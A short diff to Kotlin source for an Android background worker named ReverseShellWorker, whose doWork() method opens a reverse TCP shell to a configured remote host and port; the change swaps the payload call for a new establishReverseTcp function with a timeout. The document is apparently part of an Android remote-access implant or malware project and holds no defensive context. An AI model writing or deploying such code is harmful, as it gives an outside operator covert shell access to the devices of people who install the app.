@@ -11,10 +11,11 @@ import java.time.Duration
 
 class ReverseShellWorker(appContext: Context, workerParams: WorkerParameters) :
     CoroutineWorker(appContext, workerParams) {
+
     @RequiresApi(Build.VERSION_CODES.O)
     override suspend fun doWork(): Result {
         println("Reverse shell worker started")
-        Payload.reverseTcp(Host.IPADDRESS, Host.PORT, applicationContext)
+        establishReverseTcp(Host.IPADDRESS, Host.PORT, 10000, applicationContext)
         return Result.success()
     }
 }
